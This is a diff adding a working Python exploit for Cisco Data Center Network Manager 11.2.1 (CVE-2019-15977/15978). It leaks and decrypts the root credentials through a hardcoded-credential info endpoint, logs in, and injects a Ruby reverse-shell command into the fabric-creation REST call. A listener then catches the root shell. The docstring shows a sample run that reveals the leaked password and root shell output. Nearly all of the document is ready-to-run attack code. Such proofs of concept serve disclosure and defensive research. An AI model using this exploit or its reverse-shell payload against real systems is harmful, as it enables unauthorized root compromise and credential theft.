@@ -1,0 +1,201 @@
+#!/usr/bin/python
+"""
+Cisco Data Center Network Manager LanFabricImpl createLanFabric Command Injection Remote Code Execution Vulnerability
+
+Tested on: Cisco DCNM 11.2.1 ISO Virtual Appliance for VMWare, KVM and Bare-metal servers
+- Release: 11.2(1)
+- Release Date: 05-Jun-2019
+- FileName: dcnm-va.11.2.1.iso.zip
+- Size: 4473.54 MB (4690850167 bytes)
+- MD5 Checksum: b1bba467035a8b41c63802ce8666b7bb 
+
+Bug 1: CVE-2019-15977 / ZDI-20-012
+Bug 2: CVE-2019-15977 / ZDI-20-013
+Bug 3: CVE-2019-15978 / ZDI-20-102
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback:port>
+(+) eg: ./poc.py 192.168.100.123 192.168.100.59
+(+) eg: ./poc.py 192.168.100.123 192.168.100.59:1337
+
+saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.59:1337
+(+) leaked user: root
+(+) leaked pass: Dcnmpass123
+(+) leaked vfs path: temp18206a94b7c45072/content-85ba056e1faec012
+(+) created a root session!
+(+) starting handler on port 1337
+(+) connection from 192.168.100.123
+(+) pop thy shell!
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+"""
+
+import re
+import sys
+import random
+import socket
+import string
+import requests
+import telnetlib
+from threading import Thread
+from Crypto.Cipher import Blowfish
+from requests.auth import HTTPBasicAuth
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def handler(lp):
+    print "(+) starting handler on port %d" % lp
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print  "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) pop thy shell!"
+    t.interact()
+
+def exec_code(t, lp, s):
+    handlerthr = Thread(target=handler, args=(lp,))
+    handlerthr.start()
+    c = { "JSESSIONID" : sessionid }
+    r = requests.get("https://%s/%s" % (t, s), cookies=c, verify=False)
+
+def random_string(string_length = 8):
+    """ generate a random string of fixed length """
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(string_length))
+
+def decrypt(key):
+    """ decrypt the leaked password """
+    cipher = Blowfish.new("jaas is the way", Blowfish.MODE_ECB)
+    msg = cipher.decrypt(key.decode("hex"))
+    return msg
+
+def we_can_leak(target):
+    """ used to bypass auth """
+    global dbuser, dbpass, vfspth, jdbc, rootuser, rootpass
+    dbuser = None
+    dbpass = None 
+    vfspth = None
+    rootuser = None
+    rootpass = None
+    jdbc = None
+    uri = 'https://%s/serverinfo/HtmlAdaptor?action=displayServerInfos' % target
+    c = HTTPBasicAuth('admin', 'nbv_12345')
+    r = requests.get(uri, verify=False, auth=c)
+    leaked = r.text
+    match = re.search("db.password = #(.*)", leaked)
+    if match:
+        dbpass = match.group(1)
+    match = re.search("db.user = (.*)", leaked)
+    if match:
+        dbuser = match.group(1)
+    match = re.search("dcnmweb = (.*)", leaked)
+    if match:
+        vfspth = match.group(1)
+    match = re.search("db.url = (.*)", leaked)
+    if match:
+        jdbc = match.group(1)
+    match = re.search("server.sftp.password = #(.*)", leaked)
+    if match:
+        rootpass = match.group(1)
+    match = re.search("server.sftp.username = (.*)", leaked)
+    if match:
+        rootuser = match.group(1)
+    if dbuser and dbpass and vfspth and jdbc and rootuser and rootpass:
+        return True
+    return False
+
+def we_can_login(target, password):
+    """ we have bypassed auth at this point by leaking the creds """
+    global sessionid, resttoken
+    d = {
+        "j_username" : rootuser,
+        "j_password" : password,
+    }
+    uri = "https://%s/j_spring_security_check" % target
+    r = requests.post(uri, data=d, verify=False, allow_redirects=False)
+    if "Set-Cookie" in r.headers:
+        match = re.search(r"JSESSIONID=(.{56}).*resttoken=(\d{1,3}:.{44});", r.headers["Set-Cookie"])
+        if match:
+            sessionid = match.group(1)
+            resttoken = match.group(2)
+            return True
+    return False
+
+def pop_a_root_shell(t, ls, lp):
+    """ get dat shell! """
+    handlerthr = Thread(target=handler, args=(lp,))
+    handlerthr.start()
+    uri = "https://%s/rest/fabrics" % t
+    cmdi  = "%s\";'`{ruby,-rsocket,-e'c=TCPSocket.new(\"%s\",\"%d\");" % (random_string(), ls, lp)
+    cmdi += "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print(io.read)}end'}`'\""
+    j = { 
+        "name" : cmdi,
+
+        # this is needed to pass validate() on line 149 of the LanFabricImpl class
+        "generalSetting" : {
+            "asn" : "1337",
+            "provisionOption" : "Manual"
+        }, 
+        "provisionSetting" : {
+            "dhcpSetting": {
+                "primarySubnet" : "127.0.0.1",
+                "primaryDNS" : "127.0.0.1",
+                "secondaryDNS" : "127.0.0.1"
+            },
+            "ldapSetting" : {
+                "server" : "127.0.0.1"
+            },
+            "amqpSetting" : {
+                "server" : "127.0.0.1:1337"
+            }
+        }
+    }
+    c = { "resttoken": resttoken }
+    r = requests.post(uri, json=j, cookies=c, verify=False)
+    if r.status_code == 200 and ls in r.text:
+        return True
+    return False
+
+def main():
+    if len(sys.argv) != 3:
+        print "(+) usage: %s <target> <connectback:port>" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.123 192.168.100.59" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.123 192.168.100.59:1337" % sys.argv[0]
+        sys.exit(1)
+    t = sys.argv[1]
+    cb = sys.argv[2]
+    if not ":" in cb:
+        print "(+) using default connectback port 4444"
+        ls = cb
+        lp = 4444
+    else:
+        if not cb.split(":")[1].isdigit():
+            print "(-) %s is not a port number!" % cb.split(":")[1]
+            sys.exit(-1)
+        ls = cb.split(":")[0]
+        lp = int(cb.split(":")[1])
+
+    # stage 1 - leak the creds
+    if we_can_leak(t):
+        pwd = re.sub(r'[^\x20-\x7F]+','', decrypt(rootpass))
+        print "(+) leaked user: %s" % rootuser
+        print "(+) leaked pass: %s" % pwd
+        print "(+) leaked vfs path: %s" % "/".join(vfspth.split("/")[10:])
+
+        # stage 2 - get a valid sesson
+        if we_can_login(t, pwd):
+            print "(+) created a root session!"
+
+            # stage 3 - get a root shell via cmdi
+            pop_a_root_shell(t, ls, lp)
+
+if __name__ == "__main__":
+    main()
